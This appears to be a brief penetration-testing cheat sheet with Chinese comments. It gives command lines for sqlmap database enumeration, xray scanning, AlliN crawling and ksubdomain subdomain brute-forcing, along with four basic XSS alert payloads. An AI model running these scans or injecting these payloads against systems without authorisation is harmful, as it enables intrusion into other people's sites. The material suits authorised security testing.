# SQLmap

```python
python sqlmap.py -u  "https://xxx.xxx" --dbs
```

# XSS

```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1) />
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
```

# Xray

```shell
# 网络扫描
.\xray_windows_386.exe webscan --listen 127.0.0.1:7777 --html-output xray.html

# 服务扫描
.\xray_windows_386.exe servicescan -t 127.0.0.1:7777
```

# AlliN

```python
# 按域名爬取
python AlliN.py --host $host -m subscan --project $project --timeout 6

# 按文件爬取
python AlliN.py -f domain.txt
```

# ksubdomain

```shell
# 使用内置字典爆破
ksubdomain -d seebug.org

# 使用字典爆破域名
ksubdomain -d seebug.org -f subdomains.dict

# 字典里都是域名，可使用验证模式
ksubdomain -f dns.txt -verify
```